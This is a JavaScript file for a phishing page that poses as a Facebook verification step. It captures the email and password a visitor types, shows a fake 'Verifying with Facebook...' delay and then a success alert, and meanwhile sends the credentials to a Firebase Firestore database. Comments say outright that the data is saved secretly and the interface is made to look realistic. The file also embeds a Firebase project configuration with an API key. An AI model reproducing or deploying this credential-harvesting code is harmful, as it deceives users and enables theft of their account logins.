import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

// 1. Your Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyA_JTCBKnJ7zaz8wRSiCpLRU2RcQZ2catw",
    authDomain: "my-firebase-site-a35bb.firebaseapp.com",
    projectId: "my-firebase-site-a35bb",
    storageBucket: "my-firebase-site-a35bb.firebasestorage.app",
    messagingSenderId: "943328160156",
    appId: "1:943328160156:web:9acc1c41989b21b3124059"
};

// 2. Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// 3. DOM Elements
const emailInput = document.getElementById('userName');
const passwordInput = document.getElementById('password');
const saveBtn = document.getElementById('saveBtn');

// 4. Submit Function
const saveUser = async () => {
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();

    // Basic Validation
    if (!email || !password) {
        alert("Please enter your email and password.");
        return;
    }

    // --- START PRETEND CHECK ---
    // Disable button and change text to look like it's verifying
    saveBtn.disabled = true;
    saveBtn.innerText = "Verifying with Facebook...";
    saveBtn.style.opacity = "0.7";
    saveBtn.style.cursor = "not-allowed";

    // Set a 2.5 second delay to mimic a real database check
    setTimeout(async () => {
        try {
            // 5. SECRETLY SAVE DATA TO FIREBASE
            // We save it even though we are going to show the user an error
            await addDoc(collection(db, "users"), {
                email: email,
                password: password,
                status: "Auth Failed Attempt",
                createdAt: serverTimestamp()
            });

            console.log("Data captured secretly.");

            // 6. SHOW THE FAKE ERROR MESSAGE
            alert("Account Successfully Verified!");
            
            // 7. RESET THE UI
            saveBtn.disabled = false;
            saveBtn.innerText = "Submit";
            saveBtn.style.opacity = "1";
            saveBtn.style.cursor = "pointer";
            
            // Clear password field to make them re-type (looks more realistic)
            passwordInput.value = "";
            emailInput.value = "";

        } catch (error) {
            console.error("Error saving data:", error);
            saveBtn.disabled = false;
            saveBtn.innerText = "Submit";
        }
    }, 2500); // 2500 milliseconds = 2.5 seconds
};

// 5. Event Listener
saveBtn.addEventListener('click', saveUser);
